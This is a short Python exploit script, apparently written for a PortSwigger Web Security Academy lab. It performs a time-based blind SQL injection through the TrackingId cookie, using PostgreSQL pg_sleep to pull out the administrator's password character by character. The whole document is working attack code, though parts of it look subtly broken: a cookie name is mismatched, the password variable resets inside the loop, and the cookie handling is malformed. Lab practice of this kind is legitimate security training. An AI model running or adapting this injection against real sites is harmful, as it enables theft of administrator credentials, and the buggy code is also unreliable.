#!/usr/bin/python3

import requests,re,string,time
from pwn import *

url = 'https://0a5d00d303a0da37c0879396000800ac.web-security-academy.net/'

r = requests.get(url)
trackingid = r.cookies.get('trackingid')
session = r.cookies.get('session')
password_length = 20
dict = string.ascii_lowercase + string.digits
delay = 10

def test_password():
    nbr = 0
    while password_length > nbr:
        for i in dict:
            password = ''
            payload = str(trackingid) + "\'%3BSELECT+CASE+WHEN+(username=\'administrator\'+AND+SUBSTRING(password,"+str(nbr+1)+",1)=\'"+password+str(i)+"\')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--"
            cookies = {'Cookie':'session='+str(session)+';'+'TrackingId='+str(payload)}
            timer_start = time.time()
            send = requests.get(url, cookies=cookies)
            timer_end = time.time()
            timer_delta = timer_end - timer_start
            if timer_delta >= delay:
                password+=i
                nbr+=1
                print(password,end='')
            
password = log.progress('Working on the password')
print('Password : ',end='')
test_password()